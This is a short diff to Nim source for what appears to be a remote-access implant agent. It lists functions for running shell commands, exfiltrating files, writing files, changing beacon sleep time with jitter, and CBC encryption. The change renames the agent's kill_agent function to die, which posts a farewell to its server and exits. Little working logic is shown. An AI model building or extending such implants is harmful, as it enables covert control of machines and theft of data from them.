@@ -16,7 +16,7 @@ proc run_shell_command*(client: HttpClient, shell_command: string): bool
 proc exfil_file*(client: HttpClient, file_path: string): bool
 proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool
 proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int): bool
-proc kill_agent*(client: HttpClient): void
+proc die*(client: HttpClient): void
 
 # Encryption & Encoding
 proc encrypt_cbc*(plain_text: string, key: string, iv: string): string
@@ -120,9 +120,9 @@ proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int
     return is_success
 
 
-proc kill_agent*(client: HttpClient): void =
+proc die*(client: HttpClient): void =
     
-    discard post_data(client, protectString("kill") , protectString("""{"Good bye": ":("}"""))
+    discard post_data(client, protectString("die") , protectString("""{"Good bye": ":("}"""))
     quit()
 
 
